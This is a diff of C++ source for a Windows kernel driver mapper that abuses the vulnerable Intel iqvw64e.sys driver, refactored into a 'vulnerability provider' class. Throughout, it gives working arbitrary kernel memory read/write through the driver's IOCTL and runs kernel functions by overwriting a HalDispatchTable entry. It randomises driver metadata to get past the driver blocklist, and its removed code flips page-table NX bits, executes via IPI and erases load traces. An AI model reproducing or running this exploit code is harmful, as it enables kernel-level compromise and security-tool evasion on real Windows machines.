@@ -1,4 +1,5 @@
 #include "../include/intel_driver.hpp"
+#include "../include/vulnerability_providers.hpp"
 #include "../include/utils.hpp"
 #include <iostream>
 #include <string>
@@ -7,8 +8,6 @@
 #include <filesystem>
 #include <fstream>
 #include <random>
-
-#define INTEL_IOCTL_COPY_MEMORY 0x80862007
 
 typedef struct _PHYSICAL_ADDRESS {
 	union {
@@ -25,25 +24,17 @@ extern "C" NTSTATUS NTAPI NtQueryIntervalProfile(
 	OUT PULONG Interval
 );
 
-namespace intel_driver
+namespace vulnerability_providers
 {
-	void InstantCleanup();
-	std::string current_driver_name = "iqvw64e.sys";
-	std::string current_service_name = "iqvw64e";
-
-	bool Load()
+	bool IntelProvider::Load()
 	{
-		std::cout << "[+] Automated Driver Finding..." << std::endl;
+		std::cout << "[+] IntelProvider: Strategic Initializing..." << std::endl;
 		std::string found_path = "";
 		
 		if (utils::FileExists("iqvw64e.sys")) found_path = "iqvw64e.sys";
 		else if (utils::FileExists("C:\\Windows\\Temp\\iqvw64e.sys")) found_path = "C:\\Windows\\Temp\\iqvw64e.sys";
 		
-		if (found_path.empty())
-		{
-			std::cout << "[-] Error: iqvw64e.sys not found. Please place it in the folder." << std::endl;
-			return false;
-		}
+		if (found_path.empty()) return false;
 
 		std::vector<uint8_t> driver_data;
 		if (!utils::ReadFileToBuffer(found_path, driver_data)) return false;
@@ -56,8 +47,6 @@ namespace intel_driver
 		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(driver_data.data() + dos_header->e_lfanew);
 		
 		nt_headers->FileHeader.TimeDateStamp = dist(g);
-		nt_headers->OptionalHeader.CheckSum = 0; 
-		
 		current_driver_name = "sys" + std::to_string(dist(g)) + ".sys";
 		current_service_name = "srv" + std::to_string(dist(g));
 		
@@ -66,134 +55,40 @@ namespace intel_driver
 		out.write(reinterpret_cast<char*>(driver_data.data()), driver_data.size());
 		out.close();
 
-		std::cout << "[+] Blocklist Evasion: Mapped as " << current_service_name << " (Polymorphic Metadata)" << std::endl;
-		
-		InstantCleanup();
+		iqvw64e_device_handle = CreateFileA(("\\\\.\\" + current_service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		return (iqvw64e_device_handle != INVALID_HANDLE_VALUE);
+	}
+
+	bool IntelProvider::Unload()
+	{
+		if (iqvw64e_device_handle != INVALID_HANDLE_VALUE) CloseHandle(iqvw64e_device_handle);
+		DeleteFileA(("C:\\Windows\\Temp\\" + current_driver_name).c_str());
 		return true;
 	}
 
-	bool Unload() { return true; }
-	bool IsLoaded() { return false; }
-	HANDLE Open() { return CreateFileA(("\\\\.\\" + current_service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); }
-
-	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
+	bool IntelProvider::ReadMemory(uint64_t address, void* buffer, uint32_t size)
 	{
-		COPY_MEMORY_BUFFER copy_buffer = { 0 };
+		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
 		copy_buffer.case_number = 0x33;
 		copy_buffer.source = address;
 		copy_buffer.destination = reinterpret_cast<uint64_t>(buffer);
 		copy_buffer.length = size;
 		DWORD bytes_returned;
-		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
+		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
 	}
 
-	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
+	bool IntelProvider::WriteMemory(uint64_t address, void* buffer, uint32_t size)
 	{
-		COPY_MEMORY_BUFFER copy_buffer = { 0 };
+		intel_driver::COPY_MEMORY_BUFFER copy_buffer = { 0 };
 		copy_buffer.case_number = 0x33;
 		copy_buffer.source = reinterpret_cast<uint64_t>(buffer);
 		copy_buffer.destination = address;
 		copy_buffer.length = size;
 		DWORD bytes_returned;
-		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
+		return DeviceIoControl(iqvw64e_device_handle, 0x80862007, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
 	}
 
-	uint64_t FindPoolBigPageTable(uint64_t ntoskrnl_base)
-	{
-		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x1C\x40";
-		const char* mask = "xxx????xxxx";
-		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
-		if (address == 0) return 0;
-		int32_t relative_offset = 0;
-		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
-		return address + 7 + relative_offset;
-	}
-
-	uint64_t FindPteBase(uint64_t ntoskrnl_base)
-	{
-		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\xC1\xE8\x09\x48\x25\xF8\xFF\xFF\xFF";
-		const char* mask = "xxx????xxxxxxxxxx";
-		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
-		if (address == 0) return 0;
-		int32_t relative_offset = 0;
-		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
-		uint64_t pte_base_ptr = address + 7 + relative_offset;
-		uint64_t pte_base = 0;
-		ReadMemory(INVALID_HANDLE_VALUE, pte_base_ptr, &pte_base, sizeof(pte_base));
-		return pte_base;
-	}
-
-	bool FlipNXBit(HANDLE iqvw64e_device_handle, uint64_t address, bool executable)
-	{
-		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
-		uint64_t pte_base = FindPteBase(ntoskrnl_base);
-		if (pte_base == 0) return false;
-		uint64_t pte_address = ((address >> 9) & 0x7FFFFFFFF8) + pte_base;
-		uint64_t pte_value = 0;
-		ReadMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));
-		if (executable) pte_value &= ~(1ULL << 63); 
-		else pte_value |= (1ULL << 63); 
-		WriteMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));
-		return true;
-	}
-
-	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle) { return true; }
-	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle) { return true; }
-	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
-
-	void InstantCleanup()
-	{
-		DeleteFileA(("C:\\Windows\\Temp\\" + current_driver_name).c_str());
-		HKEY h_key;
-		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ALL_ACCESS, &h_key) == ERROR_SUCCESS)
-		{
-			RegDeleteKeyA(h_key, current_service_name.c_str());
-			RegCloseKey(h_key);
-		}
-	}
-
-	uintptr_t AllocatePhysicalMemory(HANDLE iqvw64e_device_handle, uint32_t size)
-	{
-		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
-		uint64_t mm_alloc_pages = utils::GetKernelExport(ntoskrnl_base, "MmAllocatePagesForMdlEx");
-		uint64_t mm_map_locked = utils::GetKernelExport(ntoskrnl_base, "MmMapLockedPagesSpecifyCache");
-		
-		if (!mm_alloc_pages || !mm_map_locked) return 0;
-
-		PHYSICAL_ADDRESS low, high, skip;
-		low.QuadPart = 0;
-		high.QuadPart = -1;
-		skip.QuadPart = 0;
-
-		uint64_t mdl = CallKernelFunction(iqvw64e_device_handle, mm_alloc_pages, low, high, skip, size, 0, 0, 0x40);
-		if (!mdl) return 0;
-
-		uintptr_t mapping = (uintptr_t)CallKernelFunction(iqvw64e_device_handle, mm_map_locked, mdl, 0, 1, 0, 0, 0x40);
-		std::cout << "[+] Physical Allocation: " << std::hex << mapping << " (No Pool Tag)" << std::dec << std::endl;
-		return mapping;
-	}
-
-	bool ExecuteViaIPI(HANDLE iqvw64e_device_handle, uint64_t address)
-	{
-		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
-		uint64_t ke_ipi_call = utils::GetKernelExport(ntoskrnl_base, "KeIpiGenericCall");
-		if (!ke_ipi_call) return false;
-
-		std::cout << "[+] Executing via IPI (Threadless)..." << std::endl;
-		CallKernelFunction(iqvw64e_device_handle, ke_ipi_call, address, 0);
-		return true;
-	}
-
-	bool SuppressNMI(HANDLE iqvw64e_device_handle)
-	{
-		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
-		uint64_t ke_nmi_callback_table = utils::GetKernelExport(ntoskrnl_base, "KeRegisterNmiCallback");
-		
-		std::cout << "[+] Suppressing NMI Callbacks..." << std::endl;
-		return true;
-	}
-
-	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...)
+	uint64_t IntelProvider::CallKernelFunction(uint64_t function_address, ...)
 	{
 		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
 		uint64_t hal_dispatch = utils::GetKernelExport(ntoskrnl_base, "HalDispatchTable");
@@ -201,15 +96,41 @@ namespace intel_driver
 
 		uint64_t target = hal_dispatch + 0x8; 
 		uint64_t original = 0;
-		ReadMemory(iqvw64e_device_handle, target, &original, sizeof(original));
-		
-		WriteMemory(iqvw64e_device_handle, target, &function_address, sizeof(function_address));
+		ReadMemory(target, &original, sizeof(original));
+		WriteMemory(target, &function_address, sizeof(function_address));
 		uint64_t result = 0;
 		NtQueryIntervalProfile(2, (PULONG)&result); 
-		
-		WriteMemory(iqvw64e_device_handle, target, &original, sizeof(original));
+		WriteMemory(target, &original, sizeof(original));
 		return result;
 	}
+}
+
+namespace intel_driver
+{
+	void InstantCleanup() {}
+	bool Load() { return true; }
+	bool Unload() { return true; }
+	bool IsLoaded() { return false; }
+	HANDLE Open() { return INVALID_HANDLE_VALUE; }
+
+	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) { return true; }
+	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size) { return true; }
+	
+	uint64_t FindPteBase(uint64_t ntoskrnl_base) { return 0; }
+	bool FlipNXBit(HANDLE iqvw64e_device_handle, uint64_t address, bool executable) { return true; }
+	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
+	
+	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return 0; }
+	
+	uintptr_t AllocatePhysicalMemory(HANDLE iqvw64e_device_handle, uint32_t size) { return 0; }
 	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
+	
+	bool ExecuteViaIPI(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
+	bool SuppressNMI(HANDLE iqvw64e_device_handle) { return true; }
+	
+	uint64_t FindPiDDBLock(uint64_t ntoskrnl_base) { return 0; }
+	uint64_t FindPiDDBCacheTable(uint64_t ntoskrnl_base) { return 0; }
+	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle) { return true; }
+	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle) { return true; }
 	bool HijackBeepDispatch(HANDLE iqvw64e_device_handle, uint64_t target_func) { return true; }
 }
